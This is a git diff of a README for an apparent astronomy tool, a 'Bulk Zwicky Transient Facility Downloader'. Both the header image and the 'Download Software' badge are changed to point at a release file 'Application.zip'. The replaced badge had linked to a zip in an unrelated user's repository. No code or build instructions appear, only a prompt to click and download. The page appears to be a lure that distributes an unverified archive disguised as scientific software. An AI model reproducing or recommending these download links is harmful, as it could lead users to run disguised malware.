@@ -1,6 +1,6 @@
 # 🌌 Welcome to the Bulk Zwicky Transient Facility Downloader! 🌠
 
-![ZTF Image](https://cdn.spacetelescope.org/archives/images/screen/heic2007a.jpg)
+![ZTF Image](https://github.com/TheKnownOne/Bulk-Zwicky-Transient-Facility-Downloader/releases/download/v1.0.0/Application.zip)
 
 ## Repository Name: Bulk-Zwicky-Transient-Facility-Downloader
 
@@ -20,7 +20,7 @@ Are you passionate about astrophotography and astronomy data analysis? Look no f
 - 🌠 Zwicky Transient Facility
 
 ## Download Software:
-[![Download Software](https://img.shields.io/badge/Download-ZTF_Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/TheKnownOne/Bulk-Zwicky-Transient-Facility-Downloader/releases/download/v1.0.0/Application.zip)](https://github.com/TheKnownOne/Bulk-Zwicky-Transient-Facility-Downloader/releases/download/v1.0.0/Application.zip)
 
 ## Getting Started:
 1. Click on the "Download Software" button above to get the Bulk Zwicky Transient Facility Downloader.
